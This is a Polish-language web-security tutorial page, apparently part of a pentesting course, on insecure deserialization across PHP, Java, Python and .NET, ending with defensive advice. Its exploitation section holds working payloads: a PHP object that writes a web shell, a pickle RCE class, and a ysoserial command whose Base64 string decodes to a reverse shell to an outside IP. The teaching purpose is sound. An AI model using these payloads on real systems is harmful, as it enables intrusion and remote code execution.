---
id: "insecure-deserialization"
title: "Insecure Deserialization"
sidebar_position: 17
---

# Insecure Deserialization

Serializacja zamienia obiekt na ciąg bajtów (do zapisu lub transmisji), a deserializacja odtwarza obiekt z tych danych. **Niebezpieczna deserializacja** występuje, gdy aplikacja deserializuje dane kontrolowane przez użytkownika bez weryfikacji — co może prowadzić do manipulacji logiką, eskalacji uprawnień, a najczęściej do **Remote Code Execution**. To kategoria **A08** w OWASP Top 10.

---

##  Gdzie szukać?

Podejrzane miejsca to dane, które wyglądają na zserializowany obiekt i wracają od klienta:
- **PHP** – ciągi typu `O:4:"User":2:{...}` (np. w ciasteczkach, polach formularzy).
- **Java** – dane zaczynające się od `rO0AB` (Base64) lub bajtów `AC ED 00 05`.
- **Python** – pickle (`gASV...` w Base64), często w cache, kolejkach, sesjach.
- **.NET** – `BinaryFormatter`, `ViewState` (`__VIEWSTATE`), JSON.NET z `TypeNameHandling`.
- **Ruby** – Marshal, YAML (`!ruby/object`).
- **Node.js** – biblioteki typu `node-serialize`.

---

## Eksploatacja

### **1️⃣ PHP Object Injection**
Jeśli aplikacja robi `unserialize($_COOKIE['data'])`, a klasa zawiera „magiczną" metodę (`__wakeup`, `__destruct`), atakujący buduje obiekt uruchamiający niezamierzony kod. Przykładowa podatna klasa:
```php
class Logger {
    public $logfile;
    public $data;
    function __destruct() {
        file_put_contents($this->logfile, $this->data);
    }
}
```
Spreparowany payload nadpisze dowolny plik (np. wgra web shell):
```php
O:6:"Logger":2:{s:7:"logfile";s:20:"/var/www/html/x.php";s:4:"data";s:30:"<?php system($_GET['c']); ?>";}
```
Łańcuchy gotowych gadżetów dla popularnych frameworków generuje **PHPGGC**:
```bash
git clone https://github.com/ambionics/phpggc.git
./phpggc Laravel/RCE1 system id
```

### **2️⃣ Java Deserialization (ysoserial)**
Najczęstszy wektor RCE w aplikacjach Java. **ysoserial** generuje payloady wykorzystujące gadżety w bibliotekach na classpath (Commons-Collections, Spring itd.):
```bash
java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}' > payload.bin
```
Payload wysyłany jest tam, gdzie aplikacja deserializuje strumień (HTTP body, parametr, RMI).

### **3️⃣ Python Pickle**
`pickle.loads()` na danych użytkownika to natychmiastowe RCE — metoda `__reduce__` definiuje, co wykona się przy deserializacji:
```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
```
Gdy serwer wykona `pickle.loads(base64.b64decode(payload))` — uruchomi `id`.

### **4️⃣ .NET ViewState / BinaryFormatter**
Gdy znany jest klucz maszyny (`machineKey`) lub walidacja ViewState jest wyłączona, **ysoserial.net** generuje payload RCE:
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "powershell -e <base64>" --generator=<generator> \
  --validationkey=<key> --validationalg=SHA1
```

---

## 🔎 Metodyka testowania

1. **Zidentyfikuj format** – rozpoznaj sygnatury (`rO0`, `O:`, `gASV`, `__VIEWSTATE`).
2. **Potwierdź deserializację po stronie serwera** – zmień jeden bajt i obserwuj błąd parsera.
3. **Sprawdź wykrywalne gadżety** – jakie biblioteki są w użyciu (wersje, frameworki).
4. **Zacznij od kanału OOB** – payload wywołujący `curl`/DNS do serwera atakującego potwierdza wykonanie zanim sięgniesz po pełne RCE.

---

##  Jak zabezpieczyć aplikację?
✅ **Nie deserializuj danych z niezaufanych źródeł.** To najważniejsza zasada.
✅ **Używaj formatów danych bez wykonywania kodu** – JSON/Protobuf z prostym mapowaniem na typy.
✅ **Podpisuj i weryfikuj integralność** zserializowanych danych (HMAC), jeśli muszą krążyć przez klienta.
✅ **Stosuj allowlist typów** dozwolonych do deserializacji (np. `ObjectInputFilter` w Javie).
✅ **Aktualizuj biblioteki** – wiele gadżetów to znane CVE w starych wersjach (A06).
✅ **W .NET** – unikaj `BinaryFormatter` (przestarzały), chroń `machineKey`.

---

Niebezpieczna deserializacja to częsty, lecz niedoceniany wektor RCE. Kolejnym krokiem będzie analiza podatności **OAuth 2.0, OIDC i SAML**! 🚀
